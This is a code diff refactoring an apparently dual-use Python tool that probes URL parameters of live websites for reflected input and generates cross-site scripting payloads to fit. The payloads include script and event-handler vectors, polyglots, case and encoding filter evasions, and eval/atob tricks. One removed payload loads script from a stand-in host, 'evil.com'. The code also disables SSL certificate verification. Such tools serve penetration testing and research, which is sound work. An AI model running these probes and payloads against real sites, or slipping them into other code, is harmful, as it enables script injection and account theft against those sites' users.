-            params = self.extract_parameters(url)
-            return len(params) > 0
-        except Exception as e:
-            logging.error(f"Error validating URL parameters: {str(e)}")
-            return False
-
-    def validate_url_list(self, urls: List[str]) -> Tuple[bool, List[str]]:
-        valid_urls = [url.strip() for url in urls if self.validate_url_parameters(url.strip())]
-        return bool(valid_urls), valid_urls
+        h.update(self.custom_headers)
+        return h
 
     async def init_session(self):
         connector = aiohttp.TCPConnector(
             limit=self.max_connections,
             ttl_dns_cache=300,
             enable_cleanup_closed=True,
-            force_close=True,
-            ssl=False
+            ssl=False,
         )
-        headers = self.get_default_headers()
-        headers.update(self.custom_headers)
+        logging.info("SSL certificate verification is disabled")
         self.session = aiohttp.ClientSession(
-            timeout=aiohttp.ClientTimeout(total=self.timeout),
             connector=connector,
-            headers=headers
+            timeout=aiohttp.ClientTimeout(total=self.timeout),
+            headers=self._build_headers(),
+            trust_env=True,
+        )
+        self._rate_sem = asyncio.Semaphore(1 if self._delay > 0 else self.max_connections)
+
+    async def close_session(self):
+        if self.session and not self.session.closed:
+            await self.session.close()
+            await asyncio.sleep(0.25)
+
+    # ── Core reflection testing ──────────────────────────────────────────
+
+    async def _check_reflection(self, url: str, param: str, payload: str) -> bool:
+        """Send payload as the value of param (preserving other params) and check verbatim reflection."""
+        cache_key = f"{url}|{param}|{payload}"
+        cached = self.cache.get(cache_key)
+        if cached is not None:
+            return cached
+
+        parsed = urllib.parse.urlparse(url)
+        original_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        test_params = {k: v[0] for k, v in original_params.items()}
+        test_params[param] = payload
+        test_url = urllib.parse.urlunparse(
+            parsed._replace(query=urllib.parse.urlencode(test_params))
         )
 
-    async def test_single_char(self, url: str, param: str, char: str, session: aiohttp.ClientSession) -> bool:
+        async with self._rate_sem:
+            if self._delay > 0:
+                await asyncio.sleep(self._delay)
+
+            for attempt in range(self.retries + 1):
+                try:
+                    kw: Dict[str, Any] = {}
+                    if self.proxy:
+                        kw['proxy'] = self.proxy
+
+                    async with self.session.get(test_url, **kw) as resp:
+                        self.stats['requests'] += 1
+                        if resp.status != 200:
+                            self.cache.set(cache_key, False)
+                            return False
+                        body = await resp.text()
+                        result = payload in body
+                        self.cache.set(cache_key, result)
+                        return result
+
+                except (asyncio.TimeoutError, aiohttp.ClientError) as exc:
+                    self.stats['failures'] += 1
+                    if attempt < self.retries:
+                        await asyncio.sleep(0.5 * (attempt + 1))
+                        continue
+                    logging.debug(f"Request failed after {self.retries + 1} attempts for param={param}: {exc}")
+                    self.cache.set(cache_key, False)
+                    return False
+                except Exception as exc:
+                    self.stats['failures'] += 1
+                    logging.debug(f"Unexpected error testing param={param}: {exc}")
+                    self.cache.set(cache_key, False)
+                    return False
+
+        return False
+
+    async def _test_char(self, url: str, param: str, char: str) -> Tuple[str, bool]:
+        """Test whether a single character is reflected raw (unencoded) by sending it tripled."""
+        probe = char * 3
+        result = await self._check_reflection(url, param, probe)
+        return char, result
+
+    # ── High-level analysis methods ──────────────────────────────────────
+
+    async def analyze_chars(self, url: str, param: str, on_progress=None) -> Tuple[Set[str], Set[str]]:
+        """Return (allowed_chars, blocked_chars) by testing each char for raw reflection."""
+        canary = f"xDyN{''.join(random.choices(string.ascii_lowercase, k=8))}"
+        if not await self._check_reflection(url, param, canary):
+            logging.info(f"Parameter '{param}' does not reflect input — skipping")
+            return set(), set()
+
+        all_chars: Set[str] = set()
+        for chars in self.char_groups.values():
+            all_chars.update(chars)
+
+        char_list = sorted(all_chars)
+        results: Dict[str, bool] = {}
+        batch_sz = min(self.max_connections, 50)
+
+        for i in range(0, len(char_list), batch_sz):
+            batch = char_list[i:i + batch_sz]
+            batch_results = await asyncio.gather(*[
+                self._test_char(url, param, c) for c in batch
+            ])
+            for c, ok in batch_results:
+                results[c] = ok
+            if on_progress:
+                on_progress(len(batch))
+
+        allowed = {c for c, ok in results.items() if ok}
+        blocked = {c for c, ok in results.items() if not ok}
+        return allowed, blocked
+
+    async def test_script_tags(self, url: str, param: str) -> bool:
+        """Test if script-like patterns survive server-side filtering (full payload reflection)."""
+        probes = [
+            "<script>", "<SCRIPT>", "<ScRiPt>",
+            "<%73cript>", "<scr<script>ipt>",
+            "<img src=x onerror=", "<svg onload=",
+            "<iframe onload=", "<video onloadstart=",
+            "<<script>>", "</script>", "<script/>",
+        ]
+        tasks = [self._check_reflection(url, param, p) for p in probes]
+        results = await asyncio.gather(*tasks)
+        return any(results)
+
+    async def test_event_handlers(self, url: str, param: str) -> bool:
+        """Test if event handler strings survive server-side filtering (full payload reflection)."""
+        probes = [
+            "onmouseover=", "onclick=", "onerror=", "onload=",
+            "onfocus=", "onblur=", "onkeyup=", "onkeydown=",
+            "onmouseenter=", "onmouseleave=", "ondblclick=",
+            "oncontextmenu=", "onsubmit=", "onchange=",
+        ]
+        tasks = [self._check_reflection(url, param, p) for p in probes]
+        results = await asyncio.gather(*tasks)
+        return any(results)
+
+    async def test_max_length(self, url: str, param: str) -> Optional[int]:
+        """Binary search for the maximum payload length the server reflects verbatim."""
+        if not await self._check_reflection(url, param, 'A' * 10):
+            return None
+        lo, hi = 10, 5000
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            if await self._check_reflection(url, param, 'A' * mid):
+                lo = mid + 1
+            else:
+                hi = mid - 1
+        return hi if hi >= 10 else None
+
+    async def analyze_parameter(self, url: str, param: str, on_progress=None) -> ParamAnalysis:
+        """Full analysis of a single parameter's reflection behaviour."""
+        if not self.quiet:
+            host = urllib.parse.urlparse(url).netloc
+            print(f"\r{' ' * 120}\r  {C('>', Fore.YELLOW)} "
+                  f"[{C(host, Fore.WHITE)}] Testing parameter: {C(param, Fore.CYAN)}",
+                  end='', flush=True)
+
+        allowed, blocked = await self.analyze_chars(url, param, on_progress=on_progress)
+
+        if not allowed:
+            self.stats['params_analyzed'] += 1
+            return ParamAnalysis(param=param, url=url)
+
+        scripts, events, max_len = await asyncio.gather(
+            self.test_script_tags(url, param),
+            self.test_event_handlers(url, param),
+            self.test_max_length(url, param),
+        )
+        self.stats['params_analyzed'] += 1
+
+        analysis = ParamAnalysis(
+            param=param, url=url,
+            allowed_chars=allowed, blocked_chars=blocked,
+            max_length=max_len,
+            allows_spaces=' ' in allowed,
+            allows_quotes='"' in allowed or "'" in allowed,
+            allows_angles='<' in allowed and '>' in allowed,
+            allows_parens='(' in allowed and ')' in allowed,
+            allows_scripts=scripts,
+            allows_events=events,
+        )
+
+        if self.verbose and not self.quiet:
+            payloads_preview = len(self.generate_payloads(analysis))
+            print(f"\n    {C('Allowed chars:', Fore.GREEN)} {len(allowed)}  "
+                  f"{C('Blocked:', Fore.RED)} {len(blocked)}  "
+                  f"{C('Angles:', Fore.CYAN)} {'Y' if analysis.allows_angles else 'N'}  "
+                  f"{C('Quotes:', Fore.CYAN)} {'Y' if analysis.allows_quotes else 'N'}  "
+                  f"{C('Scripts:', Fore.CYAN)} {'Y' if scripts else 'N'}  "
+                  f"{C('Events:', Fore.CYAN)} {'Y' if events else 'N'}  "
+                  f"{C('MaxLen:', Fore.CYAN)} {max_len or '?'}  "
+                  f"{C('Payloads:', Fore.CYAN)} {payloads_preview}")
+
+        return analysis
+
+    # ── URL parameter extraction ─────────────────────────────────────────
+
+    @staticmethod
+    def extract_parameters(url: str) -> Dict[str, Optional[str]]:
         try:
             parsed = urllib.parse.urlparse(url)
-            test_params = {param: char * 2}
-            test_url = urllib.parse.urlunparse(
-                parsed._replace(query=urllib.parse.urlencode(test_params))
-            )
-            async with session.get(test_url, timeout=2) as response:
-                if response.status != 200:
-                    return False
-                content = await response.text()
-                return char * 2 in content
-        except Exception:
-            return False
+            if not parsed.query:
+                return {}
+            params: Dict[str, Optional[str]] = {}
+            for pair in re.split('[&;]', parsed.query):
+                if not pair:
+                    continue
+                if '=' not in pair:
+                    params[urllib.parse.unquote(pair)] = None
+                else:
+                    k, v = pair.split('=', 1)
+                    params[urllib.parse.unquote(k)] = urllib.parse.unquote(v) if v else None
+            return params
+        except Exception as e:
+            logging.error(f"Error parsing URL parameters: {e}")
+            return {}
 
-    async def quick_test_scripts(self, url: str, param: str) -> bool:
-        test_payloads = [
-            "<script>",
-            "<SCRIPT>",
-            "<ScRiPt>",
-            "<%73cript>",
-            "<scr<script>ipt>",
-            "<svg/script>",
-            "<<script>>",
-            "</script>",
-            "<script/>",
-            "\\x3Cscript\\x3E",
-            "&lt;script&gt;",
-            "&#x3C;script&#x3E;",
-            "<img src=x onerror=",
-            "<svg onload=",
-            "<iframe onload=",
-            "<video onloadstart="
-        ]
-        for payload in test_payloads:
-            allowed = await self.test_chars_batch(url, param, payload)
-            if allowed:
-                return True
-        return False
+    # ── Payload generation ───────────────────────────────────────────────
 
-    async def quick_test_events(self, url: str, param: str) -> bool:
-        test_payloads = [
-            "onmouseover=",
-            "onclick=",
-            "onerror=",
-            "onload=",
-            "onmouseenter=",
-            "onmouseleave=",
-            "onfocus=",
-            "onblur=",
-            "onkeyup=",
-            "onkeydown=",
-            "ondblclick=",
-            "oncontextmenu=",
-            "ondrag=",
-            "ondragend=",
-            "onkeypress=",
-            "onchange=",
-            "onsubmit="
-        ]
-        for payload in test_payloads:
-            allowed = await self.test_chars_batch(url, param, payload)
-            if allowed:
-                return True
-        return False
+    @staticmethod
+    def get_predefined_payloads(analysis: ParamAnalysis) -> Set[str]:
+        payloads: Set[str] = set()
+        a = analysis.allowed_chars
+        has_eq = '=' in a
+        has_slash = '/' in a
 
-    async def quick_test_length(self, url: str, param: str) -> Optional[int]:
-        left, right = 10, 5000
-        while left <= right:
-            mid = (left + right) // 2
-            test_str = 'A' * mid
-            allowed = await self.test_chars_batch(url, param, test_str)
-            if allowed:
-                left = mid + 1
-            else:
-                right = mid - 1
-        return right if right > 0 else None
-
-    def get_predefined_payloads(self, analysis: ParamAnalysis) -> Set[str]:
-        payloads = set()
-        if (analysis.allows_angles and analysis.allows_scripts and
-            '=' in analysis.allowed_chars and
-            '/' in analysis.allowed_chars):
+        if analysis.allows_angles and analysis.allows_scripts and has_eq and has_slash:
             payloads.update([
                 "<script>alert(1)</script>",
                 "<script>prompt(1)</script>",
@@ -838,20 +579,24 @@ class XSSParamAnalyzer:
                 "<svg/onload=alert/&#42;&#42;/(4)>",
                 "<svg/onload=alert&#x2F;**&#47;(5)>",
                 "<body onload=alert(1)>",
-                "<iframe onload=alert(1)>"
+                "<iframe onload=alert(1)>",
             ])
             if analysis.allows_quotes:
                 payloads.update([
-                    "<script type=\"text/javascript\">javascript:alert(1);</script>",
-                    "\"><script>prompt()</script>",
-                    "\"><img src=x onerror=prompt()>",
-                    "\"><iMg SrC=x onError=prompt()>",
-                    "<img src=\"x\" onerror=\"alert(1)\">",
-                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>",
+                    '<script type="text/javascript">javascript:alert(1);</script>',
+                    '"><script>prompt()</script>',
+                    '"><img src=x onerror=prompt()>',
+                    '"><iMg SrC=x onError=prompt()>',
+                    '<img src="x" onerror="alert(1)">',
+                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style>"
+                    "</template></noembed></script><html \" onmouseover="
+                    "/*&lt;svg/*/onload=alert()//>",
                     "'\"--></style></script><svg onload=alert(1)//",
                     "\"'--></style></script><img src=x onerror=alert(1)>",
-                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=alert(1)//>"
+                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style>"
+                    "</template></noembed></script><html \" onmouseover=alert(1)//>",
                 ])
+
         if not analysis.allows_angles:
             payloads.update([
                 "javascript:alert(1)",
@@ -859,8 +604,9 @@ class XSSParamAnalyzer:
                 "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
                 "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                 "%3Cscript%3Ealert(1)%3C/script%3E",
-                "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
+                "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
             ])
+
         if analysis.allows_angles and analysis.allows_quotes:
             payloads.update([
                 "<style>@import 'javascript:alert(1)';</style>",
@@ -868,58 +614,64 @@ class XSSParamAnalyzer:
                 "<div style='background-image: url(javascript:alert(1))'>",
                 "<style>*[{}*{background:url(javascript:alert(1))}]{color: red};</style>",
                 "<div style=\"background:url(javascript:alert(1))\">",
-                "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationend=\"alert(1)\"></div>"
+                '<style>@keyframes x{}</style>'
+                '<div style="animation-name:x" onanimationend="alert(1)"></div>',
             ])
+
         return payloads
 
-    def generate_dynamic_payloads(self, analysis: ParamAnalysis) -> Set[str]:
-        dynamic_payloads = set()
-        if analysis.allows_angles and '<' in analysis.allowed_chars and '>' in analysis.allowed_chars:
-            base_tags = ['script', 'img', 'svg', 'iframe', 'video', 'audio', 'body']
-            event_handlers = ['onload', 'onerror', 'onmouseover', 'onclick', 'onmouseenter']
-            js_functions = ['alert', 'prompt', 'confirm', 'eval', 'atob']
-            tag_mutations = {
-                'script': ['ScRiPt', 'scr\x00ipt', '〈script〉'],
-                'img': ['ImG', 'i\x00mg'],
-                'svg': ['SvG', 's\x00vg']
-            }
-            for tag in base_tags:
-                if all(c in analysis.allowed_chars for c in tag):
-                    mutations = tag_mutations.get(tag, [tag])
-                    for mutated_tag in mutations:
-                        if all(c in analysis.allowed_chars for c in mutated_tag):
-                            if '*' in analysis.allowed_chars and '/' in analysis.allowed_chars:
-                                for func in js_functions:
-                                    if all(c in analysis.allowed_chars for c in func):
-                                        dynamic_payloads.update([
-                                            f"<{mutated_tag}>/**/{func}(1)/**/",
-                                            f"<{mutated_tag}>/*-->{func}(1)/**/",
-                                            f"<{mutated_tag}>//{func}(1)"
-                                        ])
-                            if '\x00' in analysis.allowed_chars:
-                                for func in js_functions:
-                                    if all(c in analysis.allowed_chars for c in func):
-                                        dynamic_payloads.update([
-                                            f"<{tag}\x00>{func}(1)",
-                                            f"<{tag}>\x00{func}(1)"
-                                        ])
-            if '=' in analysis.allowed_chars:
-                event_mutations = {
-                    'onload': ['OnLoad', 'ONLOAD', 'on\x00load'],
-                    'onerror': ['OnError', 'ONERROR', 'on\x00error']
-                }
-                for tag in ['img', 'svg', 'iframe']:
-                    if all(c in analysis.allowed_chars for c in tag):
-                        for event in event_handlers:
-                            event_vars = event_mutations.get(event, [event])
-                            for ev in event_vars:
-                                if all(c in analysis.allowed_chars for c in ev):
-                                    if analysis.allows_quotes:
-                                        dynamic_payloads.add(f"<{tag} data-{ev}=\"alert(1)\">")
-                                    if ':' in analysis.allowed_chars:
-                                        dynamic_payloads.add(f"<{tag} {ev}=javascript:alert(1)>")
-                                    if '&' in analysis.allowed_chars and ';' in analysis.allowed_chars:
-                                        dynamic_payloads.add(f"<{tag} {ev}=&quot;alert(1)&quot;>")
+    @staticmethod
+    def generate_dynamic_payloads(analysis: ParamAnalysis) -> Set[str]:
+        dyn: Set[str] = set()
+        a = analysis.allowed_chars
+
+        if analysis.allows_angles and '<' in a and '>' in a:
+            tags = ['script', 'img', 'svg', 'iframe', 'video', 'audio', 'body']
+            events = ['onload', 'onerror', 'onmouseover', 'onclick', 'onmouseenter']
+            funcs = ['alert', 'prompt', 'confirm', 'eval', 'atob']
+            mutations = {'script': ['ScRiPt'], 'img': ['ImG'], 'svg': ['SvG']}
+
+            for tag in tags:
+                if not all(c in a for c in tag):
+                    continue
+                variants = [tag] + mutations.get(tag, [])
+                for t in variants:
+                    if not all(c in a for c in t):
+                        continue
+                    if '*' in a and '/' in a:
+                        for fn in funcs:
+                            if all(c in a for c in fn):
+                                dyn.add(f"<{t}>/**/{fn}(1)/**/")
+                                dyn.add(f"<{t}>/*-->{fn}(1)/**/")
+                                dyn.add(f"<{t}>//{fn}(1)")
+                    if '\x00' in a:
+                        for fn in funcs:
+                            if all(c in a for c in fn):
+                                dyn.add(f"<{tag}\x00>{fn}(1)")
+                                dyn.add(f"<{tag}>\x00{fn}(1)")
+
+                if '=' in a:
+                    event_mutations = {
+                        'onload': ['OnLoad', 'ONLOAD'],
+                        'onerror': ['OnError', 'ONERROR'],
+                    }
+                    for ev in events:
+                        if not all(c in a for c in ev):
+                            continue
+                        ev_variants = [ev] + event_mutations.get(ev, [])
+                        for evo in ev_variants:
+                            if not all(c in a for c in evo):
+                                continue
+                            for t in [tag] + mutations.get(tag, []):
+                                if not all(c in a for c in t):
+                                    continue
+                                if analysis.allows_quotes:
+                                    dyn.add(f'<{t} data-{evo}="alert(1)">')
+                                if ':' in a:
+                                    dyn.add(f"<{t} {evo}=javascript:alert(1)>")
+                                if '&' in a and ';' in a:
+                                    dyn.add(f"<{t} {evo}=&quot;alert(1)&quot;>")
+
         if analysis.allows_angles and analysis.allows_scripts:
             dom_evasions = [
                 "<script>eval(atob(`YWxlcnQoMSk=`))</script>",
@@ -927,13 +679,13 @@ class XSSParamAnalyzer:
                 "<script>setTimeout`alert\\x28document.domain\\x29`</script>",
                 "<script>Object.assign(window,{alert:eval})('1')</script>",
                 "<script>new Function\\`alert\\`1\\`\\`</script>",
-                "<script>with(document)body.appendChild(createElement`script`).src='//evil.com'</script>",
-                "<script>eval.call`${'alert(1)'}`</script>"
+                "<script>eval.call`${'alert(1)'}`</script>",
             ]
-            for evasion in dom_evasions:
-                if all(c in analysis.allowed_chars for c in evasion):
-                    dynamic_payloads.add(evasion)
-        if all(c in analysis.allowed_chars for c in 'javascript:'):
+            for ev in dom_evasions:
+                if all(c in a for c in ev):
+                    dyn.add(ev)
+
+        if all(c in a for c in 'javascript:'):
             proto_evasions = [
                 "javascript:void(`alert(1)`)",
                 "javascript:(alert)(1)",
@@ -941,429 +693,383 @@ class XSSParamAnalyzer:
                 "javascript:this",
                 "javascript:[][filter][constructor]('alert(1)')()",
                 "javascript:alert?.()?.['']",
-                "javascript:new%20Function\\`alert\\`1\\`\\`",
-                "javascript:(?=alert)w=1,alert(w)"
+                "javascript:(?=alert)w=1,alert(w)",
             ]
-            for evasion in proto_evasions:
-                if all(c in analysis.allowed_chars for c in evasion):
-                    dynamic_payloads.add(evasion)
-        return dynamic_payloads
+            for ev in proto_evasions:
+                if all(c in a for c in ev):
+                    dyn.add(ev)
+
+        return dyn
 
     def generate_payloads(self, analysis: ParamAnalysis) -> List[str]:
-        all_payloads = set()
-        predefined_payloads = self.get_predefined_payloads(analysis)
-        all_payloads.update(predefined_payloads)
-        dynamic_payloads = self.generate_dynamic_payloads(analysis)
-        all_payloads.update(dynamic_payloads)
+        combined = self.get_predefined_payloads(analysis) | self.generate_dynamic_payloads(analysis)
+
         if analysis.max_length:
-            all_payloads = {p for p in all_payloads if len(p) <= analysis.max_length}
-        final_payloads = set()
-        for payload in all_payloads:
-            if not payload.strip():
-                continue
-            if not any(char in analysis.blocked_chars for char in payload):
-                final_payloads.add(payload)
-        return list(final_payloads)
+            combined = {p for p in combined if len(p) <= analysis.max_length}
 
-    async def retry_request(self, url: str, max_retries: int = 3, delay: float = 1) -> str:
-        for attempt in range(max_retries):
-            try:
-                async with self.session.get(url) as response:
-                    return await response.text()
-            except Exception:
-                if attempt == max_retries - 1:
-                    raise
-                await asyncio.sleep(delay * (attempt + 1))
-        return ""
+        final = []
+        for p in sorted(combined):
+            stripped = p.replace('\n', '').replace('\r', '').strip()
+            if stripped and not any(c in analysis.blocked_chars for c in stripped):
+                final.append(stripped)
+        return final
 
-    async def test_chars_batch(self, url: str, param: str, chars: str) -> bool:
-        cache = CacheManager()
-        async def test_single(char: str, session: aiohttp.ClientSession) -> Tuple[str, bool]:
-            cache_key = f"{url}:{param}:{char}"
-            cached_result = cache.get(cache_key)
-            if cached_result is not None:
-                return char, cached_result
-            try:
-                parsed = urllib.parse.urlparse(url)
-                test_params = {param: char * 2}
-                test_url = urllib.parse.urlunparse(
-                    parsed._replace(query=urllib.parse.urlencode(test_params))
-                )
-                async with session.get(test_url, timeout=2) as response:
-                    if response.status != 200:
-                        cache.set(cache_key, False)
-                        return char, False
-                    content = await response.text()
-                    result = char * 2 in content
-                    cache.set(cache_key, result)
-                    return char, result
-            except (asyncio.TimeoutError, Exception):
-                cache.set(cache_key, False)
-                return char, False
-        try:
-            batch_size = 20
-            char_batches = [chars[i:i + batch_size] for i in range(0, len(chars), batch_size)]
-            async with aiohttp.ClientSession() as session:
-                for batch in char_batches:
-                    tasks = [test_single(char, session) for char in batch]
-                    results = await asyncio.gather(*tasks)
-                    if any(is_allowed for _, is_allowed in results):
-                        return True
-            return False
-        except Exception as e:
-            logging.error(f"Error in test_chars_batch: {str(e)}")
-            return False
+    # ── Full URL analysis ────────────────────────────────────────────────
 
-    async def analyze_parameter(self, url: str, param: str) -> ParamAnalysis:
-        print(f"\r{' ' * 100}\r{Fore.YELLOW}🔍 Testing the reflective behavior for parameter: '{param}'{Style.RESET_ALL}", end='', flush=True)
-        
-        connector = aiohttp.TCPConnector(
-            limit=self.max_connections,
-            ttl_dns_cache=300,
-            enable_cleanup_closed=True
-        )
-        async with aiohttp.ClientSession(connector=connector) as session:
-            sample_size = min(10, len(self.char_groups['basic']))
-            sample_chars = list(self.char_groups['basic'])[:sample_size]
-            initial_results = await asyncio.gather(*[
-                self.test_single_char(url, param, char, session)
-                for char in sample_chars
-            ])
-            if not any(initial_results):
-                return ParamAnalysis(
-                    param=param,
-                    url=url,
-                    allowed_chars=set(),
-                    blocked_chars=set(),
-                    max_length=None,
-                    allows_spaces=False,
-                    allows_quotes=False,
-                    allows_angles=False,
-                    allows_parens=False,
-                    allows_scripts=False,
-                    allows_events=False
-                )
-            batch_size = 20
-            results = {}
-            for group_name, chars in self.char_groups.items():
-                chars_list = list(chars)
-                for i in range(0, len(chars_list), batch_size):
-                    batch = chars_list[i:i + batch_size]
-                    batch_results = await asyncio.gather(*[
-                        self.test_single_char(url, param, char, session)
-                        for char in batch
-                    ])
-                    results.update(dict(zip(batch, batch_results)))
-            allowed_chars = {char for char, allowed in results.items() if allowed}
-            blocked_chars = {char for char, allowed in results.items() if not allowed}
-            allows_scripts, allows_events, max_length = await asyncio.gather(
-                self.quick_test_scripts(url, param),
-                self.quick_test_events(url, param),
-                self.quick_test_length(url, param)
-            )
-            return ParamAnalysis(
-                param=param,
-                url=url,
-                allowed_chars=allowed_chars,
-                blocked_chars=blocked_chars,
-                max_length=max_length,
-                allows_spaces=' ' in allowed_chars,
-                allows_quotes='"' in allowed_chars or "'" in allowed_chars,
-                allows_angles='<' in allowed_chars and '>' in allowed_chars,
-                allows_parens='(' in allowed_chars and ')' in allowed_chars,
-                allows_scripts=allows_scripts,
-                allows_events=allows_events
-            )
-
-    async def analyze_url(self, url: str) -> Dict[str, List[str]]:
-        try:
-            params = self.extract_parameters(url)
-            if not params:
-                return {}
-            results = {}
-            for param in params:
-                analysis = await self.analyze_parameter(url, param)
-                if isinstance(analysis, ParamAnalysis):
-                    payloads = self.generate_payloads(analysis)
-                    if payloads:
-                        results[analysis.param] = payloads
-            return results
-        except Exception as e:
-            logging.error(f"Error analyzing {url}: {str(e)}")
+    async def analyze_url(self, url: str, on_progress=None) -> Dict[str, Any]:
+        params = self.extract_parameters(url)
+        if not params:
             return {}
+        results: Dict[str, Any] = {}
+        for param in params:
+            analysis = await self.analyze_parameter(url, param, on_progress=on_progress)
+            payloads = self.generate_payloads(analysis)
+            if payloads:
+                results[param] = {'analysis': analysis, 'payloads': payloads}
+        return results
 
-def remove_empty_lines(file_path: Path):
-    try:
-        with open(file_path, 'r') as file:
-            lines = file.readlines()
-        non_empty_lines = [line for line in lines if line.strip()]
-        with open(file_path, 'w') as file:
-            file.writelines(non_empty_lines)
-    except Exception as e:
-        logging.error(f"Error removing empty lines from {file_path}: {e}")
+    # ── Banner ───────────────────────────────────────────────────────────
 
-async def process_urls(
-        urls: List[str],
-        output_file: str,
-        max_connections: int = DEFAULT_MAX_CONNECTIONS,
-        batch_size: int = DEFAULT_BATCH_SIZE,
-        headers: Dict[str, str] = None,
-        ignored_urls: int = 0,
-        char_file: Optional[str] = None
-    ):
-    BUFFER_SIZE = 8192
-    SUMMARY_LINE_LENGTH = 30
-    analyzer = None
-    try:
-        analyzer = XSSParamAnalyzer(
-            max_connections=max_connections,
-            batch_size=batch_size,
-            output_file=output_file,
-            headers=headers,
-            char_file=char_file
-        )
-        await analyzer.init_session()
-        total_chars = sum(len(chars) for chars in analyzer.char_groups.values())
-        current_chars = 0
-        results = {}
-        start_time = time.time()
-        total_payloads = 0
-        unique_payloads = set()
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        payloads_dir = Path('payloads')
-        payloads_dir.mkdir(exist_ok=True)
-        output_path = payloads_dir / f"{output_file}_{timestamp}.txt"
-        print(f"{Fore.YELLOW}🕵️‍ Checking server characters allowance...{Style.RESET_ALL}")
+    def banner(self, version_info: Dict[str, Any]):
+        if self.quiet:
+            return
+        W = 86
+        logo = f"""\
+{Fore.RED}██╗  ██╗███████╗███████╗██████╗ ██╗   ██╗███╗   ██╗ █████╗  ██████╗ ███████╗███╗   ██╗
+╚██╗██╔╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██╔══██╗██╔════╝ ██╔════╝████╗  ██║
+ ╚███╔╝ ███████╗███████╗██║  ██║ ╚████╔╝ ██╔██╗ ██║███████║██║  ███╗█████╗  ██╔██╗ ██║
+ ██╔██╗ ╚════██║╚════██║██║  ██║  ╚██╔╝  ██║╚██╗██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║
+██╔╝ ██╗███████║███████║██████╔╝   ██║   ██║ ╚████║██║  ██║╚██████╔╝███████╗██║ ╚████║
+╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝{Style.RESET_ALL}"""
+        print(logo)
+        print(C("By Dimitris Chatzidimitris".center(W), Fore.RED))
+        print(C("Email: dimitris.chatzidimitris@gmail.com".center(W), Fore.RED))
+        print(C("Parameter Analysis / Server Characters Allowance / Dynamic Payloads Generation".center(W), Fore.RED))
         print()
+
+        cur = version_info.get('current', VERSION)
+        upd = version_info.get('update')
+        upd_str = C(upd, Fore.YELLOW) if upd else C('Up to date', Fore.GREEN)
+
+        print(C("Configuration:", Fore.CYAN))
+        print(f"  Version        : {C(cur, Fore.YELLOW)}")
+        print(f"  Update         : {upd_str}")
+        print(f"  Connections    : {C(str(self.max_connections), Fore.CYAN)}")
+        print(f"  Timeout        : {C(f'{self.timeout}s', Fore.CYAN)}")
+        print(f"  Retries        : {C(str(self.retries), Fore.CYAN)}")
+        if self.proxy:
+            print(f"  Proxy          : {C(self.proxy, Fore.CYAN)}")
+        if self._delay > 0:
+            print(f"  Delay          : {C(f'{int(self._delay * 1000)}ms', Fore.CYAN)}")
+        print()
+
+
+# ── Main processing ──────────────────────────────────────────────────────
+
+async def process_urls(analyzer: XSSParamAnalyzer, urls: List[str], *, json_output: bool = False):
+    await analyzer.init_session()
+    try:
+        start = time.time()
+        all_results: Dict[str, Dict[str, Any]] = {}
+        unique_payloads: Set[str] = set()
+        total_params = sum(len(analyzer.extract_parameters(u)) for u in urls)
+
+        if not analyzer.quiet:
+            print(C(f"Analyzing {len(urls)} URL(s) with {total_params} parameter(s)...\n", Fore.YELLOW))
+
+        pbar = None
+        if not analyzer.quiet:
+            pbar = tqdm(
+                total=total_params,
+                desc="Parameters",
+                bar_format="{desc}: {percentage:3.0f}%|{bar}| {n}/{total} [{elapsed}<{remaining}]",
+                colour="red",
+                dynamic_ncols=True,
+            )
+
         for url in urls:
-            result = await analyzer.analyze_url(url)
-            if result:
-                results[url] = result
-                for param_payloads in result.values():
-                    total_payloads += len(param_payloads)
-                    unique_payloads.update(param_payloads)
-        print("\n\n", end='', flush=True)
-        progress_bar = tqdm_asyncio(
-            total=total_chars,
-            desc="Progress",
-            bar_format="{desc}: {percentage:3.0f}%|{bar}| [Characters: {n}/{total}] [Time:{elapsed}]",
-            colour="red",
-            dynamic_ncols=True,
-            leave=True,
-            initial=current_chars
-        )
-        while current_chars < total_chars:
-            current_chars += 1
-            progress_bar.update(1)
-            await asyncio.sleep(0.01)
-        progress_bar.close()
-        try:
-            with open(output_path, 'w', buffering=BUFFER_SIZE) as f:
+            url_results: Dict[str, Any] = {}
+            params = analyzer.extract_parameters(url)
+            for param in params:
+                analysis = await analyzer.analyze_parameter(url, param)
+                payloads = analyzer.generate_payloads(analysis)
+                if payloads:
+                    url_results[param] = {'analysis': analysis, 'payloads': payloads}
+                    unique_payloads.update(payloads)
+                if pbar:
+                    pbar.update(1)
+                    pbar.set_postfix_str(
+                        f"payloads={len(unique_payloads)} "
+                        f"reqs={analyzer.stats['requests']}"
+                    )
+            if url_results:
+                all_results[url] = url_results
+
+        if pbar:
+            pbar.close()
+
+        elapsed = time.time() - start
+        mins, secs = divmod(int(elapsed), 60)
+
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        if json_output:
+            out_path = analyzer.payloads_dir / f"{analyzer.output_file}_{ts}.json"
+            json_data = {
+                'version': VERSION,
+                'timestamp': datetime.now().isoformat(),
+                'config': {
+                    'max_connections': analyzer.max_connections,
+                    'timeout': analyzer.timeout,
+                    'retries': analyzer.retries,
+                    'proxy': analyzer.proxy,
+                    'delay_ms': int(analyzer._delay * 1000),
+                },
+                'results': [],
+                'summary': {
+                    'urls_processed': len(urls),
+                    'total_payloads': sum(
+                        len(pr['payloads'])
+                        for ur in all_results.values()
+                        for pr in ur.values()
+                    ),
+                    'unique_payloads': len(unique_payloads),
+                    'duration_seconds': round(elapsed, 2),
